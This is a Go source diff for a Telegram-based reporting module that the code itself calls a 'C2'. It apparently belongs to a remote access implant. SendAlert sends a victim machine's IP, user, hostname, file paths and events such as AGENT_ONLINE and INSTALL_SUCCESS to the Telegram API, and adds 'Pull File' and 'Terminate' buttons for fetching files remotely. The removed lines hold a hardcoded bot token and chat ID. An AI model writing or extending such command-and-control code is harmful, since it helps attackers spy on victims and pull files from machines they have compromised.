@@ -3,16 +3,30 @@ package telegram
 
 import (
 	"fmt"
+	"log"
 	"net/http"
 	"net/url"
+	"os"
 	"time"
 )
 
-const (
-	DefaultBotToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
-	DefaultChatID   = "5439698489"
-	TelegramAPIURL  = "https://api.telegram.org/bot%s/sendMessage"
+var (
+	botToken string
+	chatID   string
 )
+
+func init() {
+	botToken = os.Getenv("TG_BOT_TOKEN")
+	chatID = os.Getenv("TG_CHAT_ID")
+
+	if botToken == "" || chatID == "" {
+		log.Println("################################################################")
+		log.Println("WARNING: TELEGRAM ENVIRONMENT VARIABLES MISSING!")
+		log.Println("TG_BOT_TOKEN or TG_CHAT_ID is not set.")
+		log.Println("Notifications will not be sent.")
+		log.Println("################################################################")
+	}
+}
 
 // AlertData represents the structured content for a system alert.
 type AlertData struct {
@@ -26,35 +40,54 @@ type AlertData struct {
 
 // SendAlert sends a highly structured HTML report to the Telegram C2.
 func SendAlert(data AlertData) error {
-	apiURL := fmt.Sprintf(TelegramAPIURL, DefaultBotToken)
+	if botToken == "" || chatID == "" {
+		return fmt.Errorf("telegram configuration missing")
+	}
+
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+
+	icon := "🔔"
+	switch data.EventType {
+	case "AGENT_ONLINE":
+		icon = "🟢"
+	case "FILE_DELETED":
+		icon = "🗑️"
+	case "FILE_EDITED":
+		icon = "📝"
+	case "INSTALL_SUCCESS":
+		icon = "🚀"
+	}
 
 	report := fmt.Sprintf(
-		"<b>SYSTEM ALERT: [%s] ACQUIRED</b>\n"+
-			"------------------------------------\n"+
-			"<b>TARGET:</b> %s\n"+
-			"<b>USER:</b>   %s\n"+
-			"<b>IP:</b>     %s\n"+
-			"<b>PATH:</b>   <code>%s</code>\n"+
-			"<b>INFO:</b>   %s\n"+
-			"------------------------------------\n"+
-			"<i>TIMESTAMP: %s</i>",
-		data.EventType,
-		data.Hostname,
-		data.User,
+		"<b>%s SYSTEM ALERT: %s</b>\n"+
+			"━━━━━━━━━━━━━━━━━━━━\n"+
+			"<b>📍 IP TARGET :</b> <code>%s</code>\n"+
+			"<b>👤 USER      :</b> <code>%s</code>\n"+
+			"<b>🖥️ HOSTNAME  :</b> <code>%s</code>\n"+
+			"<b>🎬 ACTION    :</b> <b>%s</b>\n"+
+			"<b>📂 PATH      :</b> <code>%s</code>\n"+
+			"<b>📝 DETAILS   :</b> %s\n"+
+			"━━━━━━━━━━━━━━━━━━━━\n"+
+			"<i>🕒 TIMESTAMP : %s</i>",
+		icon, data.EventType,
 		data.IP,
+		data.User,
+		data.Hostname,
+		data.EventType,
 		data.FilePath,
 		data.Details,
 		time.Now().Format("2006-01-02 15:04:05"),
 	)
 
 	vals := url.Values{}
-	vals.Set("chat_id", DefaultChatID)
+	vals.Set("chat_id", chatID)
 	vals.Set("text", report)
 	vals.Set("parse_mode", "HTML")
+	vals.Set("disable_web_page_preview", "true")
 
-	// Add Interactive Buttons for V2.0
+	// Add Interactive Buttons
 	if data.FilePath != "" && data.FilePath != "N/A" {
-		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": " Pull File", "callback_data": "pull:%s"}, {"text": " Terminate", "callback_data": "term"}]]}`, data.FilePath)
+		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": "📥 Pull File", "callback_data": "pull:%s"}, {"text": "💀 Terminate", "callback_data": "term"}]]}`, data.FilePath)
 		vals.Set("reply_markup", keyboard)
 	}
 
